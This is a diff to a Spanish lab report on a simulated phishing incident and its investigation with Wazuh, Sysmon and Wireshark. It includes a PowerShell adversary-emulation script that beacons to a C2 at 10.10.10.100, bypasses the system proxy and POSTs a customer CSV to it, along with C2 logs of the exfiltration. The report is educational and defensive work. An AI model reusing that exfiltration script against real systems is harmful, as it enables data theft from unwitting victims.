@@ -141,7 +141,7 @@ El equipo **PC-RRHH-01** es el *paciente cero*: es donde se abre el correo y se 
 
 ### 2.3 Herramientas de detección y registros
 
-Para la detección me apoyo sobre todo en **Wazuh**, como SIEM central que recoge y correla los eventos, y en **Sysmon**, para la telemetría detallada del endpoint. Como apoyo cuento además con el **Visor de eventos** de Windows, el **MITRE ATT&CK Navigator** para encuadrar las técnicas del atacante y **Wireshark** para inspeccionar el tráfico a nivel de paquete. En esta práctica el análisis de las conexiones con el atacante lo resolví con un script propio sobre el registro del servidor C2 (apartado 3.4), así que Wireshark queda como herramienta complementaria disponible más que como pieza que llegara a usar.
+Para la detección me apoyo sobre todo en **Wazuh**, como SIEM central que recoge y correla los eventos, y en **Sysmon**, para la telemetría detallada del endpoint. Como apoyo cuento además con el **Visor de eventos** de Windows, el **MITRE ATT&CK Navigator** para encuadrar las técnicas del atacante y **Wireshark** para inspeccionar el tráfico a nivel de paquete. En esta práctica el análisis de las conexiones con el atacante lo resolví combinando un script propio sobre el registro del servidor C2 con una **captura de Wireshark** que corrobora la exfiltración byte a byte (apartado 3.4).
 
 Las fuentes de registro que vigilo son las que cuentan la historia del ataque: los **logs del antivirus** (Defender) y del **firewall**, los **eventos del sistema operativo** (inicios de sesión 4624/4625 y creación de procesos 4688), la **telemetría de Sysmon** (procesos, conexiones de red y cambios en ficheros) y el **tráfico de red**, donde se observan el *beacon* periódico hacia el C2 y la exfiltración.
 
@@ -161,7 +161,7 @@ Desde el panel del agente consulto el resumen de eventos, el mapeo automático c
 
 ### 2.5 OSINT de IPs, dominios y hashes
 
-Como complemento a la detección interna, contrasto los indicadores observados (direcciones IP, dominios y hashes de ficheros) con fuentes de inteligencia abiertas (OSINT): **VirusTotal** y **AbuseIPDB**. Lo automatizo con un script propio que explico en el apartado 3.
+Como complemento a la detección interna, contrasto los indicadores observados (direcciones IP, dominios y hashes de ficheros) con fuentes de inteligencia abiertas (OSINT): **VirusTotal**, **AbuseIPDB** y **Shodan**. La reputación la automatizo con un script propio (VirusTotal/AbuseIPDB) y, para ver la superficie de exposición del atacante, me apoyo en Shodan, como explico en el apartado 3.
 
 ### 2.6 Ficha de registro del incidente
 
@@ -265,19 +265,31 @@ Durante la ejecución, Sysmon capturó el hash SHA-256 del proceso lanzado (`sys
 
 Mi script `osint-lookup.py` me automatiza esta consulta: detecta si el indicador es una IP, un dominio o un hash y pregunta a **VirusTotal** y **AbuseIPDB**. Para validarlo lo probé también con una IP pública conocida (8.8.8.8, de Google), que AbuseIPDB reporta con un 0 % de abuso. Las salidas completas están en `scripts/salidas-scripts.txt`.
 
+Para completar el OSINT incorporo también **Shodan**, que sirve para otra cosa distinta: no mide reputación, sino que perfila la **infraestructura expuesta a internet** de una IP o un dominio (puertos y servicios abiertos, banners, certificados). Es útil para saber a qué se enfrenta uno cuando el atacante tiene un C2 o un dominio público. Aquí hay un matiz honesto: en este laboratorio **no puedo consultar al atacante en Shodan** porque `10.10.10.100` es una **IP privada de una red aislada** y Shodan solo indexa lo que está expuesto a internet. Por eso, igual que con AbuseIPDB probé contra una IP pública real, el uso correcto de Shodan sería contra la IP o el dominio **público** del atacante una vez identificado en un caso real, nunca contra la dirección interna del escenario.
+
 ### 3.4 Análisis de las conexiones sospechosas
 
-Para estudiar la comunicación con el atacante monté un **servidor C2 propio** (`c2-server.py`) que, a diferencia de `python3 -m http.server`, **recibe y guarda en disco** el fichero que se le envía y registra los **bytes** de cada POST. Sobre ese log, mi script `analizar-conexiones.py` separa los *beacon* de la exfiltración, comprueba que las conexiones se dirigen al atacante y **suma los bytes realmente recibidos** —que es lo que confirma la exfiltración, no la simple existencia de la petición—. El resultado: **cuatro *beacon* periódicos** y **un POST de 200 bytes recibido y almacenado** en el C2, desde la víctima (10.10.10.50) hacia el atacante (10.10.10.100):
+Para estudiar la comunicación con el atacante monté un **servidor C2 propio** (`c2-server.py`) que, a diferencia de `python3 -m http.server`, **recibe y guarda en disco** el fichero que se le envía y registra los **bytes** de cada POST. Sobre ese log, mi script `analizar-conexiones.py` separa los *beacon* de la exfiltración, comprueba que las conexiones se dirigen al atacante y **suma los bytes realmente recibidos** —que es lo que confirma la exfiltración, no la simple existencia de la petición—. El resultado: **cuatro *beacon* periódicos** y **un POST de 148 bytes recibido y almacenado** en el C2, desde la víctima (10.10.10.50) hacia el atacante (10.10.10.100):
 
 ```
 === Exfiltracion de datos (POST recibidos) ===
-  [EXFIL] 10.10.10.50 -> POST /exfil_clientes.csv  200 bytes  [RECIBIDO Y ALMACENADO]
-  Total exfiltrado: 200 bytes en 1 POST
-[+] CONFIRMADO: el C2 (10.10.10.100) recibio y almaceno 200 bytes exfiltrados.
+  [EXFIL] 10.10.10.50 -> POST /exfil_clientes.csv  148 bytes  [RECIBIDO Y ALMACENADO]
+  Total exfiltrado: 148 bytes en 1 POST
+[+] CONFIRMADO: el C2 (10.10.10.100) recibio y almaceno 148 bytes exfiltrados.
     Tecnicas: C2 (T1071) y exfiltracion por el canal C2 (T1041).
 ```
 
-`[CAPTURA: consola del C2 mostrando "200 bytes guardados en recibidos/..." y el fichero en la carpeta recibidos/]`
+![Consola del servidor C2: los cuatro beacons y el POST con los 148 bytes del CSV almacenados en la carpeta `recibidos/`](images/03-c2-exfiltracion.png)
+
+#### Corroboración a nivel de red con Wireshark
+
+El recuento anterior lo saco del log de mi propio C2. Para corroborarlo por otra vía, además capturé el tráfico con **Wireshark** (`tshark -i eth0 -f "tcp port 8000"`). Filtrando por `tcp.port == 8000` se ven los cuatro *beacon* periódicos (`GET /beacon?id=1..4`) hacia el atacante —el patrón típico de un canal C2 (T1071)— y, al final, el `POST` de exfiltración:
+
+![Captura de Wireshark: beacons periódicos y POST de exfiltración hacia 10.10.10.100](images/03-wireshark-paquetes-exfil.png)
+
+Si sigo el flujo TCP del `POST /exfil_clientes.csv` (*Follow → TCP Stream*) veo la petición entera: la cabecera **`Content-Length: 148`** y, debajo, **los datos de clientes viajando en claro** hacia el atacante. Es la prueba más directa de la exfiltración a nivel de red (T1041), y el tamaño —148 bytes— coincide exactamente con lo que registró el C2 y con el fichero que quedó guardado en `recibidos/`:
+
+![Follow TCP Stream del POST: Content-Length 148 y el CSV de clientes en claro](images/03-wireshark-stream-exfil.png)
 
 ### 3.5 Detección correlada en Wazuh
 
@@ -302,7 +314,13 @@ Ese acceso deja huella en el DC como un **inicio de sesión 4624 de tipo 3** (se
 
 > Para que la alerta aparezca en Wazuh, DC-NEXORA debe tener instalado el agente enviando su canal *Security*. Si no lo tiene, el inicio de sesión 4624 se comprueba igualmente en el **Visor de eventos** del propio DC.
 
-`[CAPTURA: evento 4624 (tipo 3) de rrhh.ana en el DC y/o la alerta 100203 en Wazuh]`
+Al lanzar el script, el `net use` contra el DC se completa correctamente y enumera sus recursos (`NETLOGON`, `SYSVOL`) usando las credenciales robadas:
+
+![Ejecución de movimiento-lateral.ps1 desde la víctima contra DC-NEXORA](images/03-movimiento-lateral.png)
+
+En el **DC-NEXORA**, ese acceso queda registrado como un evento **4624 de tipo 3** a nombre de `rrhh.ana` (dominio NEXORA.LAB), con **dirección de red de origen 10.10.10.50** (la víctima) y autenticación Kerberos. Es la huella que confirma el salto al dominio:
+
+![Evento 4624 (tipo 3) de rrhh.ana desde 10.10.10.50 en el DC](images/03-dc-evento-4624.png)
 
 ### 3.7 Síntesis: de la evidencia a la conclusión
 
@@ -312,7 +330,7 @@ Para cerrar la investigación resumo cómo cada evidencia recogida sostiene una 
 |-----------|----------|------------|
 | Correo en MailHog + embudo de GoPhish | La víctima abrió el correo y envió sus credenciales | Phishing con robo de credenciales confirmado (T1566.002 / T1056.003) |
 | Sysmon + reglas Wazuh 100200/100201 | Comandos de reconocimiento y PowerShell desde la víctima | Actividad de post-explotación en PC-RRHH-01 (T1033 / T1087 / T1059.001) |
-| Log del C2 + carpeta `recibidos/` (200 bytes) | El C2 recibió y almacenó el CSV de clientes | Exfiltración de datos demostrada (T1071 / T1041) |
+| Log del C2 + carpeta `recibidos/` (148 bytes) + captura de Wireshark | El C2 recibió y almacenó el CSV de clientes; el POST viaja en claro (Content-Length 148) | Exfiltración de datos demostrada (T1071 / T1041) |
 | Evento 4624 (tipo 3) en el DC | Inicio de sesión de `rrhh.ana` desde 10.10.10.50 | Movimiento lateral al dominio con credenciales válidas (T1078 / T1021.002) |
 | SHA-256 + cadena de custodia sellada | Huella de cada evidencia, con libro protegido | Integridad verificable frente a una referencia fiable |
 
@@ -322,7 +340,7 @@ Un análisis honesto separa lo demostrado de lo que son hipótesis:
 
 - **Confirmado por evidencias:** el robo de credenciales (GoPhish), el reconocimiento en la víctima (Sysmon/Wazuh), la **exfiltración del CSV** (recibido y almacenado por el C2) y el **movimiento lateral** al DC (evento 4624).
 - **Hipótesis no confirmadas:** no se ha determinado el alcance real de los datos consultados más allá del CSV de prueba, ni se ha observado **persistencia** efectiva (no apareció una tarea programada maliciosa en este escenario).
-- **Registros que faltarían en un caso real:** una captura de tráfico completa (Wireshark/PCAP) para correlacionar la transferencia byte a byte, y los logs del propio controlador de dominio si no tuviera agente de Wazuh.
+- **Registros que faltarían en un caso real:** los logs del propio controlador de dominio si no tuviera agente de Wazuh, y una captura de tráfico de mayor duración para estudiar el comportamiento del C2 a lo largo del tiempo (la exfiltración puntual sí quedó capturada byte a byte con Wireshark, apartado 3.4).
 - **Investigación adicional recomendada:** revisar otras cuentas con inicio de sesión en los equipos afectados (eventos 4624 en todo el dominio), buscar reutilización de la credencial en otros servicios y analizar en *sandbox* cualquier binario o adjunto sospechoso.
 
 ---
@@ -353,6 +371,14 @@ Para ejecutar los primeros pasos de forma ordenada y, sobre todo, **trazable**, 
 ```powershell
 .\respuesta-aislar.ps1 -IPAtacante 10.10.10.100
 ```
+
+Al ejecutarlo, el script va dejando traza de cada paso —recogida de evidencia volátil, bloqueo del atacante en el firewall, aislamiento de los adaptadores y sellado final— y crea la carpeta de evidencias del incidente:
+
+![Ejecución de respuesta-aislar.ps1: recogida de evidencia, bloqueo, aislamiento y sellado SHA-256](images/04-respuesta-aislar.png)
+
+El resultado queda en `C:\Evidencias_Incidente\<fecha>\`, con el registro de acciones (`respuesta.log`) y el `SHA256SUMS.txt` que sella cada evidencia para la cadena de custodia:
+
+![respuesta.log con marcas de tiempo y SHA256SUMS.txt de las evidencias recogidas](images/04-respuesta-evidencias.png)
 
 Más allá de la respuesta inmediata, el caso se enmarca en la **ciberresiliencia**: anticipación (endurecimiento y formación), resistencia (segmentación y EDR), recuperación (copias de seguridad y *snapshots*) y evolución (lecciones aprendidas y mejora continua de las reglas de detección).
 
@@ -482,7 +508,8 @@ El analista resume: la usuaria `rrhh.ana` picó en un phishing, entregó credenc
 | Sysmon + configuración de SwiftOnSecurity | Telemetría detallada del endpoint |
 | GoPhish 0.12.1 + MailHog | Campaña de phishing y captura del correo |
 | PowerShell | Emulación del ataque (sin malware real) |
-| VirusTotal + AbuseIPDB | OSINT de indicadores de compromiso |
+| Wireshark / tshark | Captura y análisis del tráfico (beacons y exfiltración a nivel de paquete) |
+| VirusTotal + AbuseIPDB + Shodan | OSINT de indicadores de compromiso (reputación y superficie de exposición) |
 | Python 3 | Scripts propios de análisis e investigación |
 
 ---
@@ -695,6 +722,15 @@ Write-Host "=====================================================" -ForegroundCo
 #>
 
 $C2 = "10.10.10.100"
+
+# --- Salida DIRECTA a la red (sin proxy) -----------------------------
+# Windows enruta Invoke-WebRequest por el proxy del sistema / autodeteccion
+# (WPAD). En un laboratorio aislado eso DESVIA las peticiones al C2 y, al ir
+# envueltas en try/catch, el fallo pasa inadvertido (el script "termina" pero
+# el C2 no recibe nada). Forzamos conexion directa para que el beacon y la
+# exfiltracion lleguen siempre:
+[System.Net.WebRequest]::DefaultWebProxy = $null
+
 Write-Host "==== Emulacion de adversario Nexora (lab) ====" -ForegroundColor Cyan
 
 # --- Preparar el "dato sensible" si no existe ---
@@ -706,7 +742,6 @@ if (-not (Test-Path $csv)) {
 id,nombre,email,dni_ficticio,saldo
 1001,Ana Prueba,ana.prueba@nexora.lab,00000001X,1240.50
 1002,Luis Demo,luis.demo@nexora.lab,00000002Y,980.00
-1003,Marta Test,marta.test@nexora.lab,00000003Z,3150.75
 "@ | Set-Content $csv -Encoding UTF8
 }
 
@@ -724,17 +759,26 @@ Write-Host "`n[*] Fase 2: Acceso a la carpeta de clientes" -ForegroundColor Yell
 Get-Content $csv
 
 # --- Fase 3: Beacon a la IP del atacante (C2) ---
+# Cada beacon informa si llego o fallo (ya no se traga el error en silencio).
 Write-Host "`n[*] Fase 3: Beacon periodico a $C2" -ForegroundColor Yellow
-1..5 | ForEach-Object {
-    try { Invoke-WebRequest "http://$C2:8000/beacon?id=$_" -UseBasicParsing -TimeoutSec 2 | Out-Null } catch {}
+1..4 | ForEach-Object {
+    try {
+        Invoke-WebRequest "http://$C2:8000/beacon?id=$_" -UseBasicParsing -TimeoutSec 5 | Out-Null
+        Write-Host "    [+] beacon $_ enviado" -ForegroundColor DarkGray
+    } catch {
+        Write-Host "    [!] beacon $_ fallo: $($_.Exception.Message)" -ForegroundColor Red
+    }
     Start-Sleep -Seconds 2
 }
 
 # --- Fase 4: Exfiltracion del CSV (Exfiltration) ---
 Write-Host "`n[*] Fase 4: Exfiltracion del CSV de clientes a $C2" -ForegroundColor Yellow
 try {
-    Invoke-WebRequest "http://$C2:8000/exfil_clientes.csv" -Method POST -InFile $csv -UseBasicParsing -TimeoutSec 3 | Out-Null
-} catch {}
+    Invoke-WebRequest "http://$C2:8000/exfil_clientes.csv" -Method POST -InFile $csv -UseBasicParsing -TimeoutSec 10 | Out-Null
+    Write-Host "    [+] CSV exfiltrado correctamente" -ForegroundColor DarkGray
+} catch {
+    Write-Host "    [!] exfiltracion fallo: $($_.Exception.Message)" -ForegroundColor Red
+}
 
 Write-Host "`n[+] Emulacion completada. Revisa las alertas en Wazuh." -ForegroundColor Green
 ```
@@ -1502,12 +1546,12 @@ gophish_admin.crt   SHA256=a8e1e78aec584f7ceb5a64c5bafa21e46189b68b138251c66e933
 
 $ python3 c2-server.py 8000          # en el atacante (Kali, 10.10.10.100)
 
-10.10.10.50 - - [14/Nov/2026 23:37:32] "GET /beacon?id=1 HTTP/1.1" 200 -
-10.10.10.50 - - [14/Nov/2026 23:37:34] "GET /beacon?id=2 HTTP/1.1" 200 -
-10.10.10.50 - - [14/Nov/2026 23:37:36] "GET /beacon?id=3 HTTP/1.1" 200 -
-10.10.10.50 - - [14/Nov/2026 23:37:38] "GET /beacon?id=4 HTTP/1.1" 200 -
-10.10.10.50 - - [14/Nov/2026 23:37:40] "POST /exfil_clientes.csv HTTP/1.1" 200 200
-    [+] 200 bytes guardados en recibidos/20261114_233740_exfil_clientes.csv
+10.10.10.50 - - [16/Nov/2026 17:00:34] "GET /beacon?id=1 HTTP/1.1" 200 -
+10.10.10.50 - - [16/Nov/2026 17:00:34] "GET /beacon?id=2 HTTP/1.1" 200 -
+10.10.10.50 - - [16/Nov/2026 17:00:34] "GET /beacon?id=3 HTTP/1.1" 200 -
+10.10.10.50 - - [16/Nov/2026 17:00:34] "GET /beacon?id=4 HTTP/1.1" 200 -
+10.10.10.50 - - [16/Nov/2026 17:00:37] "POST /exfil_clientes.csv HTTP/1.1" 200 148
+    [+] 148 bytes guardados en recibidos/20261116_170037_exfil_clientes.csv
 
 # Análisis del log, con validación de destino y recuento de bytes recibidos:
 $ python3 analizar-conexiones.py c2.log --atacante 10.10.10.100
@@ -1526,11 +1570,11 @@ $ python3 analizar-conexiones.py c2.log --atacante 10.10.10.100
   Total beacons: 4  (patron periodico = C2, MITRE T1071)
 
 === Exfiltracion de datos (POST recibidos) ===
-  [EXFIL] 10.10.10.50 -> POST /exfil_clientes.csv  200 bytes  [RECIBIDO Y ALMACENADO]
-  Total exfiltrado: 200 bytes en 1 POST
+  [EXFIL] 10.10.10.50 -> POST /exfil_clientes.csv  148 bytes  [RECIBIDO Y ALMACENADO]
+  Total exfiltrado: 148 bytes en 1 POST
 
 [+] Conclusion:
-    CONFIRMADO: el C2 (10.10.10.100) recibio y almaceno 200 bytes exfiltrados desde la victima.
+    CONFIRMADO: el C2 (10.10.10.100) recibio y almaceno 148 bytes exfiltrados desde la victima.
     Tecnicas: C2 (T1071) y exfiltracion por el canal C2 (T1041).
 
 
